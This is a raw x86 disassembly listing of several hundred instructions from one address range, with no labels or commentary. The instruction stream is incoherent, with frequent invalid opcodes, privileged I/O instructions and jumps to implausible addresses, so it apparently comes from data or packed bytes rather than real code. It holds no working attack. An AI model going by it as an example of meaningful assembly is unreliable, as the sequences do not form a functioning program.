  40d292:	bound  esi,QWORD PTR [edx]
  40d294:	jo     0x40d226
  40d296:	xchg   ebx,eax
  40d297:	cmp    al,0xa2
  40d299:	mov    esp,0xe82d1e43
  40d29e:	jp     0x40d251
  40d2a0:	(bad)  
  40d2a1:	mov    eax,0xafc298f9
  40d2a6:	add    ah,ah
  40d2a8:	dec    edi
  40d2a9:	shr    esp,cl
  40d2ab:	loope  0x40d262
  40d2ad:	ins    BYTE PTR es:[edi],dx
  40d2ae:	fdivrp st(3),st
  40d2b0:	mov    DWORD PTR [eax-0x46],edx
  40d2b3:	fidiv  DWORD PTR ds:0xc3e27897
  40d2b9:	push   eax
  40d2ba:	lods   eax,DWORD PTR ds:[esi]
  40d2bb:	ds inc esi
  40d2bd:	cmp    al,0x6a
  40d2bf:	mov    DWORD PTR [ebx+0x4d],eax
  40d2c2:	test   eax,0x57dd29b2
  40d2c7:	inc    ebp
  40d2c8:	inc    edx
  40d2c9:	repz pop edi
  40d2cb:	clc    
  40d2cc:	mov    ch,0xf7
  40d2ce:	mov    al,0x6f
  40d2d0:	inc    esi
  40d2d1:	call   eax
  40d2d3:	lods   al,BYTE PTR ds:[esi]
  40d2d4:	xor    eax,0x8407e0ad
  40d2d9:	out    dx,al
  40d2da:	leave  
  40d2db:	mov    esp,0xbb02892c
  40d2e0:	jmp    0x6d0bc76c
  40d2e5:	mov    ch,0xe6
  40d2e7:	and    ebx,esp
  40d2e9:	cmp    ebx,esp
  40d2eb:	ss cld 
  40d2ed:	dec    ecx
  40d2ee:	jge    0x40d367
  40d2f0:	push   edi
  40d2f1:	and    DWORD PTR [edx*4+0x5e0dda64],eax
  40d2f8:	jmp    0x957b6084
  40d2fd:	and    ch,BYTE PTR [esi]
  40d2ff:	push   ebx
  40d300:	adc    eax,0x2f0e92b8
  40d305:	pusha  
  40d306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d307:	ret    0xc64f
  40d30a:	gs dec edx
  40d30c:	pop    ebx
  40d30d:	jmp    0x40d2b4
  40d30f:	mov    ds:0x68b03c18,eax
  40d314:	out    dx,eax
  40d315:	rdtsc  
  40d317:	mov    cl,0x1d
  40d319:	lsl    eax,WORD PTR [eax]
  40d31c:	cs sub eax,0x77bd495d
  40d322:	imul   BYTE PTR [esi]
  40d324:	aas    
  40d325:	ret    
  40d326:	cmp    bl,BYTE PTR [ebx+0x7138605b]
  40d32c:	lock fcmove st,st(4)
  40d32f:	shl    bh,1
  40d331:	dec    ebx
  40d332:	int    0xbc
  40d334:	lea    edi,[ebx-0x56]
  40d337:	or     al,0xb8
  40d339:	popf   
  40d33a:	add    eax,0x8fd1aa05
  40d33f:	jbe    0x40d329
  40d341:	retf   0xb5fa
  40d344:	jecxz  0x40d33b
  40d346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d347:	shl    BYTE PTR [eiz*1+0x6eacc6ae],1
  40d34e:	in     eax,0x23
  40d350:	mov    eax,ds:0x5fb98d4
  40d355:	jp     0x40d2fa
  40d357:	hlt    
  40d358:	out    dx,al
  40d359:	sub    BYTE PTR cs:[eax+0x21d43c2b],0x95
  40d361:	or     esi,DWORD PTR [edi+0x606394ad]
  40d367:	loop   0x40d3b9
  40d369:	or     al,0x95
  40d36b:	dec    esp
  40d36c:	dec    BYTE PTR [esi]
  40d36e:	and    BYTE PTR [esi+0x7d0d9ee5],bl
  40d374:	jmp    0x40d3aa
  40d376:	cli    
  40d377:	enter  0x18fb,0x18
  40d37b:	push   esp
  40d37c:	(bad)  
  40d37d:	fs sahf 
  40d37f:	or     ebp,DWORD PTR [edi]
  40d381:	clc    
  40d382:	mov    ds:0x700ca201,eax
  40d387:	test   DWORD PTR [edi+0x7f986bb],ecx
  40d38d:	ret    
  40d38e:	enter  0x3d3c,0x80
  40d392:	imul   esi,DWORD PTR [edx+0x1f71bdf0],0x2c736696
  40d39c:	pop    edi
  40d39d:	cmovno ebx,DWORD PTR [ecx]
  40d3a0:	mov    ebx,0x3fd43715
  40d3a5:	inc    ebp
  40d3a6:	sub    al,0xdc
  40d3a8:	imul   eax,eax,0x6c
  40d3ab:	lock popf 
  40d3ad:	dec    eax
  40d3ae:	popf   
  40d3af:	fs mov cl,0xc6
  40d3b2:	inc    dl
  40d3b4:	iret   
  40d3b5:	pop    ebx
  40d3b6:	jl     0x40d3a7
  40d3b8:	add    eax,0x60d7fc7d
  40d3bd:	sti    
  40d3be:	imul   ebp,DWORD PTR [edx+0x6c],0xffffffb9
  40d3c2:	call   esp
  40d3c4:	adc    eax,0xbd8a3253
  40d3c9:	xor    DWORD PTR [ecx-0x44da4b8e],edi
  40d3cf:	scas   eax,DWORD PTR es:[edi]
  40d3d0:	cdq    
  40d3d1:	sbb    al,0x3a
  40d3d3:	jns    0x40d429
  40d3d5:	sub    al,0x3d
  40d3d7:	sub    BYTE PTR [ecx+0x6],al
  40d3da:	icebp  
  40d3db:	es int 0x3c
  40d3de:	push   ebp
  40d3df:	rcr    DWORD PTR [eax+0x5ef29e2e],cl
  40d3e5:	pop    edi
  40d3e6:	and    eax,0xbeff8925
  40d3eb:	xor    cl,BYTE PTR [ebx]
  40d3ed:	push   ds
  40d3ee:	out    0xd2,al
  40d3f0:	add    edi,eax
  40d3f2:	or     al,0x3c
  40d3f4:	or     eax,0xb1ccc793
  40d3f9:	push   ss
  40d3fa:	add    esi,edx
  40d3fc:	cmp    dl,BYTE PTR ds:0xc57a4100
  40d402:	push   ecx
  40d403:	or     BYTE PTR [esi],al
  40d405:	dec    esp
  40d406:	in     eax,0x8e
  40d408:	push   0xffffffa1
  40d40a:	adc    cl,cl
  40d40c:	mov    ch,0x2c
  40d40e:	jbe    0x40d3d8
  40d410:	or     BYTE PTR [ecx+0x6cf5db4f],dl
  40d416:	retf   0x8c2
  40d419:	push   esi
  40d41a:	cmc    
  40d41b:	fild   QWORD PTR [ebp+0x14]
  40d41e:	pop    edi
  40d41f:	lock xor eax,0xdcbe0179
  40d425:	mov    ds:0x9850c819,al
  40d42a:	sub    cl,ah
  40d42c:	or     al,0xe0
  40d42e:	push   edi
  40d42f:	lds    ebp,FWORD PTR [edi-0x5e]
  40d432:	test   DWORD PTR [ecx+0x2f],0xaee66799
  40d439:	ds add ch,ah
  40d43c:	mov    eax,ds:0xcbcefda5
  40d441:	jo     0x40d3d8
  40d443:	adc    BYTE PTR [ebx+0x85bd5ed],bh
  40d449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d44a:	arpl   cx,dx
  40d44c:	shr    cl,1
  40d44e:	jno    0x40d3d0
  40d450:	les    eax,FWORD PTR fs:[edi+0x76]
  40d454:	pushf  
  40d455:	mov    eax,0xf66e2d8f
  40d45a:	(bad)  
  40d45b:	mov    dl,0x7e
  40d45d:	outs   dx,DWORD PTR ds:[esi]
  40d45e:	xor    al,0xa9
  40d460:	imul   DWORD PTR [edi]
  40d462:	les    ecx,FWORD PTR [ebp+0x59]
  40d465:	mov    al,0x5f
  40d467:	in     eax,dx
  40d468:	repz push esp
  40d46a:	fwait
  40d46b:	sbb    dh,BYTE PTR [esi+0x66fccb21]
  40d471:	or     al,0x69
  40d473:	inc    edi
  40d474:	xchg   ecx,ecx
  40d476:	std    
  40d477:	fstp   TBYTE PTR [ecx+0x4860f28b]
  40d47d:	and    al,0x6e
  40d47f:	jle    0x40d4ea
  40d481:	pop    es
  40d482:	out    0xec,al
  40d484:	dec    ecx
  40d485:	xchg   esi,eax
  40d486:	sub    DWORD PTR ds:0xc6765ab3,0x7068462b
  40d490:	(bad)  
  40d491:	les    esi,FWORD PTR ds:0xd06a9d1e
  40d497:	add    esi,esp
  40d499:	push   esp
  40d49a:	outs   dx,BYTE PTR ds:[esi]
  40d49b:	lahf   
  40d49c:	ret    
  40d49d:	pop    ecx
  40d49e:	loopne 0x40d4bb
  40d4a0:	mov    eax,ds:0x94109837
  40d4a5:	jae    0x40d42c
  40d4a7:	cwde   
  40d4a8:	jns    0x40d4af
  40d4aa:	mov    dl,0xf2
  40d4ac:	popa   
  40d4ad:	dec    ecx
  40d4ae:	lds    ecx,FWORD PTR [ecx]
  40d4b0:	mov    ch,0x99
  40d4b2:	or     al,0x6c
  40d4b4:	icebp  
  40d4b5:	loope  0x40d4d8
  40d4b7:	mov    eax,ds:0x4653512d
  40d4bc:	push   DWORD PTR [esi+0x75]
  40d4bf:	mov    BYTE PTR [edi],dh
  40d4c1:	dec    ecx
  40d4c2:	lea    esp,[eax-0x79]
  40d4c5:	push   0xf0f0c723
  40d4ca:	ret    
  40d4cb:	push   ecx
  40d4cc:	rcr    BYTE PTR [ecx],0x17
  40d4cf:	mov    ds:0xa00f6880,al
  40d4d4:	mov    esp,0xc1721970
  40d4d9:	pusha  
  40d4da:	out    dx,eax
  40d4db:	ror    BYTE PTR [eax+ecx*2-0x2],0xab
  40d4e0:	xchg   esi,eax
  40d4e1:	pusha  
  40d4e2:	pop    ecx
  40d4e3:	add    BYTE PTR [ecx],ah
  40d4e5:	adc    ah,ch
  40d4e7:	cwde   
  40d4e8:	enter  0x2e39,0x7e
  40d4ec:	pop    esi
  40d4ed:	xchg   DWORD PTR [edx-0x36],esi
  40d4f0:	fcmovb st,st(0)
  40d4f2:	mov    ecx,0x4bb0832a
  40d4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f8:	int3   
  40d4f9:	push   ebx
  40d4fb:	fisub  WORD PTR [ecx]
  40d4fd:	sti    
  40d4fe:	mov    al,0xaa
  40d500:	test   BYTE PTR [edi],0x51
  40d503:	fwait
  40d504:	(bad)  
  40d505:	int3   
  40d506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d507:	pushf  
  40d508:	adc    BYTE PTR [ecx+esi*2],0xbc
  40d50c:	inc    esi
  40d50d:	shl    DWORD PTR [ecx+0x44],cl
  40d510:	call   0xf604d8be
  40d515:	jns    0x40d4f1
  40d517:	add    DWORD PTR [ecx-0x1fa57133],edi
  40d51d:	and    al,BYTE PTR [edi]
  40d51f:	sbb    eax,0xfe66455e
  40d524:	test   DWORD PTR [esi+ecx*2-0x38],edi
  40d528:	jge    0x40d4e4
  40d52a:	clc    
  40d52b:	push   es
  40d52c:	inc    ecx
  40d52d:	and    al,0x8e
  40d52f:	retf   0x159a
  40d532:	and    al,0xd2
  40d534:	scas   eax,DWORD PTR es:[edi]
  40d535:	push   cs
  40d536:	pop    eax
  40d537:	xchg   esp,eax
  40d538:	xchg   ebp,eax
  40d539:	stos   DWORD PTR es:[edi],eax
  40d53a:	xchg   ebx,eax
  40d53b:	je     0x40d557
  40d53d:	fdiv   QWORD PTR [esp+edi*2+0x63]
  40d541:	pop    es
  40d542:	fidiv  WORD PTR [eax-0x3b]
  40d545:	jge    0x40d550
  40d547:	or     eax,0xd9bd6420
  40d54c:	rcr    BYTE PTR [esi+0x703a01c5],cl
  40d552:	add    DWORD PTR [edi],ebx
  40d554:	pop    ebx
  40d555:	xchg   esp,eax
  40d556:	mov    ?,WORD PTR [ecx+edx*2]
  40d559:	test   eax,0xb471f395
  40d55e:	addr16 jnp 0x40d56e
  40d561:	dec    edx
  40d562:	sahf   
  40d563:	loop   0x40d501
  40d565:	mov    eax,ds:0xa230b568
  40d56a:	call   0x8b0d89fa
  40d56f:	jg     0x40d5b6
  40d571:	in     eax,0x9a
  40d573:	into   
  40d574:	xor    eax,0xc2f9eab9
  40d579:	lahf   
  40d57a:	or     al,0x93
  40d57c:	jge    0x40d5a6
  40d57e:	mov    ebp,DWORD PTR [eax-0x71469858]
  40d584:	inc    ebp
  40d585:	sar    DWORD PTR [ebx-0x3d6e5171],cl
  40d58b:	stos   DWORD PTR es:[edi],eax
  40d58c:	fldenv [ecx]
  40d58e:	add    DWORD PTR [edi-0x53baee84],0xffffffe2
  40d595:	push   edx
  40d596:	and    eax,0xa1f757eb
  40d59b:	add    ah,dl
  40d59d:	push   ebp
  40d59e:	test   al,0x2b
  40d5a0:	pop    edx
  40d5a1:	jg     0x40d546
  40d5a3:	mov    ah,0xf3
  40d5a5:	xchg   DWORD PTR ds:0x2c38dc51,ebp
  40d5ab:	icebp  
  40d5ac:	mov    bl,0x38
  40d5ae:	mov    ch,0x43
  40d5b0:	pop    eax
  40d5b1:	je     0x40d568
  40d5b3:	sub    DWORD PTR [edx],ebx
  40d5b5:	mov    esi,0xb5f75b5a
  40d5ba:	mov    ebx,0x5a40d015
  40d5bf:	ret    0x302a
  40d5c2:	or     BYTE PTR [esi+0x24452395],ah
  40d5c8:	(bad)  
  40d5c9:	outs   dx,BYTE PTR ds:[esi]
  40d5ca:	fs push ecx
  40d5cc:	push   ebp
  40d5cd:	dec    ebp
  40d5ce:	shr    DWORD PTR [ecx+0x47082ea3],1
  40d5d4:	test   eax,0xce26fcbd
  40d5d9:	int3   
  40d5da:	mov    ds:0x1744f2de,eax
  40d5df:	jg     0x40d56d
  40d5e1:	fistp  QWORD PTR [esi-0x50]
  40d5e4:	cmp    edx,esi
  40d5e6:	hlt    
  40d5e7:	jge    0x40d653
  40d5e9:	popf   
  40d5ea:	cmp    bh,ch
  40d5ec:	lock fimul WORD PTR [edx]
  40d5ef:	cmp    bl,cl
  40d5f1:	adc    eax,0xcb4158ba
  40d5f6:	add    al,0x6
  40d5f8:	add    eax,0xc70c8a0e
  40d5fd:	mov    ah,0xbc
  40d5ff:	push   eax
  40d600:	mov    ds:0xe4936b75,eax
  40d605:	inc    esp
  40d606:	jp     0x40d5b1
  40d608:	mov    eax,0x1b3b56dd
  40d60d:	popa   
  40d60e:	clc    
  40d60f:	adc    al,0x17
  40d611:	dec    ebp
  40d612:	ret    0x64b5
  40d615:	xchg   ebp,eax
  40d616:	(bad)  
  40d617:	or     DWORD PTR [edx],ecx
  40d619:	loopne 0x40d64f
  40d61b:	addr16 and bl,bl
  40d61e:	ret    
  40d61f:	out    dx,al
  40d620:	stos   DWORD PTR es:[edi],eax
  40d621:	(bad)  
  40d622:	cmp    bl,ch
  40d624:	and    esi,esp
  40d626:	fadd   st,st(4)
  40d628:	or     eax,0xadcd3542
  40d62d:	dec    eax
  40d62e:	(bad)  
  40d630:	inc    eax
  40d631:	xor    esi,DWORD PTR [eax+0x23453456]
  40d637:	ror    DWORD PTR [eax-0x61a9e574],1
  40d63d:	stc    
  40d63e:	or     eax,0xee3f78
  40d643:	js     0x40d6b1
  40d645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d646:	push   ds
  40d647:	mov    bh,0x62
  40d649:	cld    
  40d64a:	(bad)  
  40d64b:	xchg   ecx,eax
  40d64c:	push   eax
  40d64d:	add    BYTE PTR [eax],al
  40d64f:	addr16 popa 
  40d651:	into   
  40d652:	mul    BYTE PTR [ebx-0x4c]
  40d655:	jb     0x40d5ec
  40d657:	mov    ds:0xf0c6c3c9,al
  40d65c:	popa   
  40d65d:	xor    al,0x31
  40d65f:	push   eax
  40d660:	mov    dl,0xce
  40d662:	lock xchg ebx,eax
  40d664:	test   BYTE PTR [edi+ecx*1+0x9823c5f],0x53
  40d66c:	cmp    eax,0x1e4dec4e
  40d671:	sti    
  40d672:	std    
  40d673:	and    bh,BYTE PTR [edi]
  40d675:	cmp    eax,DWORD PTR [esi]
  40d677:	pop    es
  40d678:	sub    ah,BYTE PTR [esp+edi*2]
  40d67b:	cmp    DWORD PTR [ebp+0x3f73cbba],edi
  40d681:	(bad)  
  40d682:	jb     0x40d6a8
  40d684:	je     0x40d658
  40d686:	sbb    dl,BYTE PTR [edi+0x49b6eeb8]
  40d68c:	jg     0x40d68c
  40d68e:	mov    edi,0x87537834
  40d693:	inc    edi
  40d694:	mov    al,BYTE PTR [edi+0x17d37ff]
  40d69a:	sbb    DWORD PTR [eax+esi*1-0x1cdd19f0],ecx
  40d6a1:	add    BYTE PTR [edx-0x45],bh
  40d6a4:	xchg   ebx,eax
  40d6a5:	outs   dx,BYTE PTR ds:[esi]
  40d6a6:	adc    al,0xc8
  40d6a8:	xor    al,BYTE PTR ds:0x5d066eb2
  40d6ae:	push   esi
  40d6af:	pop    es
  40d6b0:	fistp  DWORD PTR [eax+eiz*4+0xbd0e6bf]
  40d6b7:	fdiv   DWORD PTR [eax]
  40d6b9:	add    BYTE PTR [edx],dl
  40d6bb:	pop    ecx
  40d6bc:	mov    eax,0x5a815d26
  40d6c1:	aam    0x9c
  40d6c3:	or     eax,0x58a46850
  40d6c8:	xor    DWORD PTR [ebx-0x31a61231],edx
  40d6ce:	push   cs
  40d6cf:	xchg   edi,eax
  40d6d0:	lea    ecx,[ecx]
  40d6d2:	pop    ss
  40d6d3:	push   edi
  40d6d4:	sub    edx,DWORD PTR [edx]
  40d6d6:	mov    BYTE PTR [esi-0x22],ah
  40d6d9:	shl    BYTE PTR [ecx-0x2e],1
  40d6dc:	ret    0x560c
  40d6df:	test   DWORD PTR [edi*4+0x5b8fb42e],edi
  40d6e6:	jle    0x40d6f3
  40d6e8:	(bad)  
  40d6e9:	fwait
  40d6ea:	sbb    BYTE PTR ds:0x7329a088,bh
  40d6f0:	add    al,0xa9
  40d6f2:	cdq    
  40d6f3:	gs jb  0x40d6fd
  40d6f6:	dec    esp
  40d6f7:	icebp  
  40d6f8:	ds adc cl,dl
  40d6fb:	loop   0x40d6cf
  40d6fd:	js     0x40d733
  40d6ff:	sub    BYTE PTR [esi],bl
  40d701:	and    esp,DWORD PTR cs:[ebp-0x29]
  40d705:	mov    edx,esi
  40d707:	jle    0x40d6dd
  40d709:	stos   BYTE PTR es:[edi],al
  40d70a:	je     0x40d742
  40d70c:	pusha  
  40d70d:	inc    esi
  40d70e:	jo     0x40d69a
  40d710:	mov    edx,0xc5d01650
  40d715:	mov    DWORD PTR [edi-0xe181e08],ebp
  40d71b:	pushf  
  40d71c:	pop    esi
  40d71d:	outs   dx,BYTE PTR ds:[esi]
  40d71e:	xchg   bl,bh
  40d720:	jmp    0xe02f:0x374fc23
  40d727:	into   
  40d728:	dec    edi
  40d729:	pop    ss
  40d72a:	sbb    ch,BYTE PTR [ebp+0x1f2f83ab]
  40d730:	xchg   edx,eax
  40d731:	mov    ss,WORD PTR [ebp+esi*1+0x675b5576]
  40d738:	xchg   edi,eax
  40d739:	call   0x613f88a0
  40d73e:	add    ecx,DWORD PTR [esi-0x7a81ba3c]
  40d744:	shr    BYTE PTR [ecx+0x1f],cl
  40d747:	xchg   esp,eax
  40d748:	add    esi,DWORD PTR [eax+0x22]
  40d74b:	adc    ch,BYTE PTR [eax+ebp*8+0x5c448831]
  40d752:	pushf  
  40d753:	ins    BYTE PTR es:[edi],dx
  40d754:	fistp  QWORD PTR [esi]
  40d756:	ja     0x40d7c2
  40d758:	sbb    eax,0x8eff87f6
  40d75d:	sar    DWORD PTR [ebp+0xd9e4637],1
  40d763:	mov    bh,BYTE PTR [esi]
  40d765:	mov    dl,0xf9
  40d767:	js     0x40d7e7
  40d769:	neg    DWORD PTR [ebx+0xd]
  40d76c:	addr16 push es
  40d76e:	and    DWORD PTR [eax+ecx*8+0x4e],esi
  40d772:	jno    0x40d714
  40d774:	nop
  40d775:	mov    ch,0xe4
  40d777:	hlt    
  40d778:	pop    es
  40d779:	jmp    0xbe459185
  40d77e:	mov    dl,0xe5
  40d780:	mov    bh,0x72
  40d782:	shr    DWORD PTR [edx],0x5b
  40d785:	push   edx
  40d786:	imul   esp,DWORD PTR [eax],0x46c908c3
  40d78c:	push   esp
  40d78d:	(bad)
  40d790:	xchg   ebx,eax
  40d791:	mov    ch,0x2e
  40d793:	push   eax
  40d794:	sbb    eax,0x7292598a
  40d799:	push   ecx
  40d79a:	adc    cl,dl
  40d79c:	out    dx,al
  40d79d:	les    ebp,FWORD PTR [ecx+0x6]
  40d7a0:	ss pop eax
  40d7a2:	ret    
  40d7a3:	and    al,0x86
  40d7a5:	cwde   
  40d7a6:	rol    DWORD PTR [ecx-0x62038fff],1
  40d7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ad:	inc    esp
  40d7ae:	inc    ecx
  40d7af:	es (bad) 
  40d7b1:	sbb    al,BYTE PTR [ecx-0x331facbc]
  40d7b7:	jne    0x40d7a3
  40d7b9:	call   0xd3d8:0x4e6c0e43
  40d7c0:	pop    ds
  40d7c1:	mov    WORD PTR [edi-0x1d],gs
  40d7c4:	clc    
  40d7c5:	xchg   ebp,eax
  40d7c6:	adc    al,0xef
  40d7c8:	enter  0xb44d,0x32
  40d7cc:	sbb    BYTE PTR [ecx],0x0
  40d7cf:	mov    bl,0x1
  40d7d1:	mov    ds:0x2903a770,al
  40d7d6:	loop   0x40d7c1
  40d7d8:	test   edi,edi
  40d7da:	stc    
  40d7db:	xchg   bh,ch
  40d7dd:	adc    BYTE PTR [edx-0x76],0x72
  40d7e1:	xchg   BYTE PTR [edi],bh
  40d7e3:	lahf   
  40d7e4:	ins    BYTE PTR es:[edi],dx
  40d7e5:	add    bl,0x50
  40d7e8:	pop    ebp
  40d7e9:	push   edi
  40d7ea:	push   esi
  40d7eb:	cbw    
  40d7ed:	push   esi
  40d7ee:	mov    esp,0x47d4a487
  40d7f3:	add    cl,al
  40d7f5:	and    eax,0xfdac980d
  40d7fa:	fwait
  40d7fb:	aaa    
  40d7fc:	int    0x33
  40d7fe:	fidivr WORD PTR [ebx+0x53]
  40d801:	pushf  
  40d802:	ret    0xbb1e
  40d805:	jmp    0xb7e7:0xada655d0
  40d80c:	xor    ebp,DWORD PTR [ebx-0x1da0bd0c]
  40d812:	rcl    BYTE PTR [ecx-0x32e301e9],0x1d
  40d819:	push   es
  40d81a:	mov    dh,0x6b
  40d81c:	sub    BYTE PTR [ecx-0x7f],bh
  40d81f:	add    ecx,eax
  40d821:	and    eax,0x8c4db3dc
  40d826:	dec    edx
  40d827:	es daa 
  40d829:	stos   BYTE PTR es:[edi],al
  40d82a:	lea    eax,[edi-0x51f57baf]
  40d830:	pop    ss
  40d831:	mov    ebx,0x372f176f
  40d836:	mov    dl,0xa8
  40d838:	sub    eax,0xddd37d19
  40d83d:	and    eax,0x1a83fc17
  40d842:	enter  0x7c0c,0x6e
  40d846:	mov    al,ds:0x7a074117
  40d84b:	bound  ecx,QWORD PTR [ebp+0x2b14e085]
  40d851:	jnp    0x40d872
  40d853:	xor    BYTE PTR [edi+0x7053041b],bh
  40d859:	cmp    ebx,DWORD PTR [ecx]
  40d85b:	fs (bad) 
  40d85d:	fmul   DWORD PTR [ebp-0x63daf64e]
  40d863:	xchg   ecx,eax
  40d864:	xchg   ebx,eax
  40d865:	data16 scas al,BYTE PTR es:[edi]
  40d867:	xchg   ebx,eax
  40d868:	repnz push 0x3c
  40d86b:	push   eax
  40d86c:	sbb    al,0xab
  40d86e:	inc    eax
  40d86f:	pop    es
  40d870:	repz inc ecx
  40d872:	ins    DWORD PTR es:[edi],dx
  40d873:	sbb    DWORD PTR [ecx+esi*1+0x29fed958],0xffffff85
  40d87b:	out    dx,eax
  40d87c:	out    0x6e,eax
  40d87e:	int    0x5f
  40d880:	pop    edx
  40d881:	shl    BYTE PTR [edi+edx*4-0x41ebe67d],1
  40d888:	test   DWORD PTR [esi],eax
  40d88a:	fisttp WORD PTR [ebx+0x53eaff41]
  40d890:	es push esp
  40d892:	cmp    al,0xbf
  40d894:	inc    esp
  40d895:	es mov esp,0xd46fa16c
  40d89b:	add    ebp,DWORD PTR ds:0xa9074016
  40d8a1:	xchg   esi,eax
  40d8a2:	not    ecx
  40d8a4:	mov    DWORD PTR [edx],esi
  40d8a6:	mov    ebp,0xdd7e093e
  40d8ab:	mov    ds:0xa0c01aad,al
  40d8b0:	jmp    0x5ae8:0x1af008bb
  40d8b7:	out    dx,eax
  40d8b8:	mov    al,ds:0x58ded81a
  40d8bd:	and    esi,edi
  40d8bf:	xchg   edi,eax
  40d8c0:	sub    eax,DWORD PTR [esi-0x247edf19]
  40d8c6:	les    edi,FWORD PTR [eax-0x47]
  40d8c9:	pop    eax
  40d8ca:	mov    al,0xb7
  40d8cc:	loopne 0x40d901
  40d8ce:	ja     0x40d873
  40d8d0:	retf   
  40d8d1:	sti    
  40d8d2:	(bad)  
  40d8d3:	or     al,0x61
  40d8d5:	and    al,0x1d
  40d8d7:	adc    DWORD PTR [esi+0x2c796f0],edi
  40d8dd:	not    BYTE PTR [ebp-0x50]
  40d8e0:	xlat   BYTE PTR ds:[ebx]
  40d8e1:	adc    edx,DWORD PTR ds:0xeb24fd9a
  40d8e7:	lea    esp,[edi+0x6e050343]
  40d8ed:	leave  
  40d8ee:	hlt    
  40d8ef:	adc    DWORD PTR [ebp+0x29],ebx
  40d8f2:	mov    esi,0x444138ee
  40d8f7:	mov    dl,0x74
  40d8f9:	scas   al,BYTE PTR es:[edi]
  40d8fa:	jg     0x40d958
  40d8fc:	pop    ebp
  40d8fd:	sbb    eax,DWORD PTR [edi+ecx*2]
  40d900:	cmp    eax,0x895cf51b
  40d905:	inc    ebp
  40d906:	jge    0x40d969
  40d908:	xor    al,0x82
  40d90a:	and    esi,esp
  40d90c:	dec    eax
  40d90d:	in     eax,0x9c
  40d90f:	sbb    al,0xbf
  40d911:	gs mov esp,0x92be1f4b
  40d917:	sub    ebx,DWORD PTR [ebp+0x76]
  40d91a:	dec    ebp
  40d91b:	jmp    0xd3a2fa22
  40d920:	mov    ds:0x53b71085,eax
  40d925:	lds    edx,FWORD PTR [edi+ecx*4]
  40d928:	iret   
  40d929:	push   eax
  40d92a:	shr    esp,1
  40d92c:	xchg   esp,eax
  40d92d:	pushf  
  40d92e:	push   esp
  40d92f:	mul    dl
  40d931:	adc    ebx,DWORD PTR [esi-0x5cea330a]
  40d937:	xchg   ebp,eax
  40d938:	inc    DWORD PTR [esi+0x13]
  40d93b:	lods   eax,DWORD PTR ds:[esi]
  40d93c:	xchg   edi,eax
  40d93d:	inc    DWORD PTR [eax-0x64]
  40d940:	out    0x5b,al
  40d942:	out    dx,al
  40d943:	jns    0x40d997
  40d945:	iret   
  40d946:	jl     0x40d8d4
  40d948:	push   ss
  40d949:	and    eax,0x803d3085
  40d94e:	or     dh,cl
  40d950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d951:	sti    
  40d952:	por    mm1,QWORD PTR [ebx-0x6b61b715]
  40d959:	mov    bh,0x13
  40d95b:	leave  
  40d95c:	ja     0x40d90e
  40d95e:	dec    ebp
  40d95f:	out    dx,eax
  40d960:	pop    ebp
  40d961:	mov    al,0x4f
  40d963:	rcl    dh,cl
  40d965:	lahf   
  40d966:	cmp    ebx,DWORD PTR [ebx-0x19e3eb10]
  40d96c:	xchg   edi,eax
  40d96d:	add    DWORD PTR [esi+0x1a5fd055],edx
  40d973:	stos   BYTE PTR es:[edi],al
  40d974:	cmp    eax,0x309fa50e
  40d979:	sbb    al,0x46
  40d97b:	inc    ebx
  40d97c:	dec    esp
  40d97d:	mov    bh,0x76
  40d97f:	gs fstp st(5)
  40d982:	in     eax,0x94
  40d984:	call   0x9dcd86f7
  40d989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d98a:	add    BYTE PTR [edi],0x86
  40d98d:	ss mov ecx,0xd44c3936
  40d993:	push   cs
  40d994:	cwde   
  40d995:	dec    ebx
  40d996:	stos   BYTE PTR es:[edi],al
  40d997:	xchg   edx,eax
  40d998:	sub    al,0xb5
  40d99a:	ins    BYTE PTR es:[edi],dx
  40d99b:	int3   
  40d99c:	xchg   edi,eax
  40d99d:	adc    eax,0xc3f331d
  40d9a2:	jne    0x40da10
  40d9a4:	mov    ds:0xe3237b78,al
  40d9a9:	xchg   ebx,eax
  40d9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ab:	xchg   dl,bl
  40d9ad:	mov    ?,WORD PTR [ebp+0x71b12a91]
  40d9b3:	les    ebx,FWORD PTR [ebx+eiz*1]
  40d9b6:	gs shl bh,cl
  40d9b9:	(bad)  
  40d9ba:	sub    ebx,DWORD PTR [edx+0x7c]
  40d9bd:	mov    bl,0xe7
  40d9bf:	cli    
  40d9c0:	jmp    0x40d9c6
  40d9c2:	into   
  40d9c3:	push   ebx
  40d9c4:	call   0x4795:0x7973d062
  40d9cb:	inc    eax
  40d9cc:	loopne 0x40d981
  40d9ce:	lods   al,BYTE PTR ds:[esi]
  40d9cf:	sub    bl,BYTE PTR [edi+0x6e]
  40d9d2:	and    edi,DWORD PTR [eax]
  40d9d4:	mov    ebx,0x7c375368
  40d9d9:	jl     0x40d970
  40d9db:	mov    edx,0xe2ed17df
  40d9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9e1:	xor    BYTE PTR [edi-0x4dc0b2b5],0xa8
  40d9e8:	jmp    ebx
  40d9ea:	sar    ecx,cl
  40d9ec:	inc    eax
  40d9ed:	clc    
  40d9ee:	xchg   ecx,eax
  40d9ef:	test   eax,0xf5e0153b
  40d9f4:	jl     0x40d993
  40d9f6:	dec    eax
  40d9f7:	test   al,0x1e
  40d9f9:	sti    
  40d9fa:	mov    edx,DWORD PTR [edx]
  40d9fc:	(bad)  
  40d9fd:	imul   esp,DWORD PTR [esp+ebp*2+0x4b],0xa10c5924
  40da05:	test   DWORD PTR ds:0x8609451d,eax
  40da0b:	push   0xfffffff7
  40da0d:	mov    ebp,0xf06fb416
  40da12:	and    eax,DWORD PTR [ebx+ebx*2]
  40da15:	or     eax,0xc38e60f1
  40da1a:	rcl    cl,cl
  40da1c:	push   ss
  40da1d:	jle    0x40da34
  40da1f:	out    0x8e,eax
  40da21:	aas    
  40da22:	je     0x40d9d2
  40da24:	je     0x40d9cc
  40da26:	cmp    ch,BYTE PTR [ecx-0x2f]
  40da29:	push   ebp
  40da2a:	add    DWORD PTR [eax+0x19],edx
